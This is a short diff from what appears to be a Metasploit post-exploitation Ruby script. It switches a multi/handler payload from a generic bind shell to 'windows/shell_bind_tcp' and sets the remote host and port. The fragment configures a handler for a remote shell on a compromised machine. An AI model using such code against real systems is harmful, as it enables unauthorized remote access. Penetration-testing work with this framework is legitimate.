@@ -40,7 +40,7 @@ meter_type = client.platform
     print_status("Starting connection handler at port #{rport}")
     mul = client.framework.exploits.create("multi/handler")
     mul.datastore['WORKSPACE'] = @client.workspace
-    mul.datastore['PAYLOAD']   = "generic/shell_bind_tcp"
+    mul.datastore['PAYLOAD']   = "windows/shell_bind_tcp"
     mul.datastore['RHOST']     = rhost
     mul.datastore['LPORT']     = rport
 
